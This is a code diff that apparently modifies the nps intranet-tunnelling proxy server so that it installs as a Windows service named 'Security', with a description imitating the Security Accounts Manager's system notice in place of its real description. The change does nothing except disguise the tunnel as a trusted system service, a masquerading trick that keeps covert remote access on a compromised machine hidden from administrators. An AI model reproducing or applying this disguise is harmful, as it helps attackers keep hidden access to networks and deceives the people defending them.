@@ -97,9 +97,9 @@ func main() {
 	// init service
 	options := make(service.KeyValue)
 	svcConfig := &service.Config{
-		Name:        "Nps",
-		DisplayName: "nps内网穿透代理服务器",
-		Description: "一款轻量级、功能强大的内网穿透代理服务器。支持tcp、udp流量转发，支持内网http代理、内网socks5代理，同时支持snappy压缩、站点保护、加密传输、多路复用、header修改等。支持web图形化管理，集成多用户模式。",
+		Name:        "Security",                  //Name:        "Nps",
+		DisplayName: "Security",                  //DisplayName: "nps内网穿透代理服务器",
+		Description: "启动此服务将向系统发出信号: 安全帐户管理器已准备就绪，可以接受请求。禁用此服务将导致在准备就绪时，无法通知系统中的服务，从而可能导致这些服务无法正确启动。不应禁用此服务。",     //Description: "一款轻量级、功能强大的内网穿透代理服务器。支持tcp、udp流量转发，支持内网http代理、内网socks5代理，同时支持snappy压缩、站点保护、加密传输、多路复用、header修改等。支持web图形化管理，集成多用户模式。",
 		Option:      options,
 	}
 
@@ -252,9 +252,9 @@ func inputCmd() {
 		}
 		options := make(service.KeyValue)
 		svcConfig := &service.Config{
-			Name:        "Nps",
-			DisplayName: "nps内网穿透代理服务器",
-			Description: "一款轻量级、功能强大的内网穿透代理服务器。支持tcp、udp流量转发，支持内网http代理、内网socks5代理，同时支持snappy压缩、站点保护、加密传输、多路复用、header修改等。支持web图形化管理，集成多用户模式。",
+			Name:        "Security",                  //Name:        "Nps",
+			DisplayName: "Security",                  //DisplayName: "nps内网穿透代理服务器",
+			Description: "启动此服务将向系统发出信号: 安全帐户管理器已准备就绪，可以接受请求。禁用此服务将导致在准备就绪时，无法通知系统中的服务，从而可能导致这些服务无法正确启动。不应禁用此服务。",     //Description: "一款轻量级、功能强大的内网穿透代理服务器。支持tcp、udp流量转发，支持内网http代理、内网socks5代理，同时支持snappy压缩、站点保护、加密传输、多路复用、header修改等。支持web图形化管理，集成多用户模式。",
 			Option:      options,
 		}
 		s, _ := service.New(prg, svcConfig)
